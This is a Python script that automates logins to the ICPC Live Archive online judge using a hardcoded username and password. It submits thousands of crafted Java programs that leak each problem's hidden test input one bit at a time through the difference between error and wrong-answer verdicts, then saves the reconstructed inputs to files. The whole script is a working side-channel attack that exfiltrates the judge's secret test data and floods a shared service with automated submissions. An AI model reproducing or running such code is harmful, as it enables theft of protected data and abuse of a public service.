import re
from robobrowser import RoboBrowser
import time

for curProgram in range(2000,7600):
    curByte=0
    input=''
    binaryString = ''

    while True:
        for shift in range(0,8):
            #navigate to acm page
            url = "https://icpcarchive.ecs.baylor.edu/index.php?option=com_content&task=view&id=15&Itemid=31"
            br = RoboBrowser(history=True)
            br.open(url)
            fp = br.parsed
            #f0 = open('f1.html', 'w')
            #f0.write(str(fp))
            
            #login
            form=br.get_form(id='mod_loginform')
            form['username'].value= 'pygather'
            form['passwd'].value= '1324354657687980'
            br.submit_form(form)
            sp = br.parsed
            #f2 = open('f2.html','w')
            #f2.write(str(sp))
        
            #navigate to quick submit
            for a in br.find_all('a', href=True, text = re.compile('Quick Submit')):
                br.follow_link(a)
            tp = br.parsed
        
        
        
            form = br.get_form(action = re.compile('Itemid=25'))
            # print(form)
            #form.new_control('text','code',{'value':''})
            #form.fixup()
            form['localid'].value=str(curProgram)
            form['language'].value='2'
            form['code'].value='import java.util.*;class Main{public static void main(String[]args) throws Exception{Scanner in = new Scanner(System.in);StringBuilder sb = new StringBuilder();while(in.hasNextLine()){sb.append(in.nextLine());}byte b=(byte)sb.charAt('+str(curByte)+');if((b>>'+str(shift)+'&0x01)==0){throw new Exception("Error");}}}'
            br.submit_form(form)
            #f3 = open('f3.html','w')
            #f3.write(str(tp))
            #print(tp)

            a=br.find_all('a', href=True, text = re.compile('My Submissions'))
            for link in a:
                #print(a)
                br.follow_link(link)
        
            tr = br.select('.sectiontableentry1')
            stra = str(tr[8])
            #print(stra[295:307])
        
            if 'Wrong answer' in stra:
                binaryString += '1'
            else:
                binaryString += '0'

                print('Submitted',curProgram,curByte, binaryString[::-1])
        if(curByte>1):
            intval = int(binaryString[::-1],2)
            if(intval==0):
                break
            input += chr(intval)
        binaryString = ''
        print()
        if input != '':
            print(input)
            print()
        curByte+=1
    f = open(str(curProgram)+'.in','w')
    f.write(input)
    f.close()
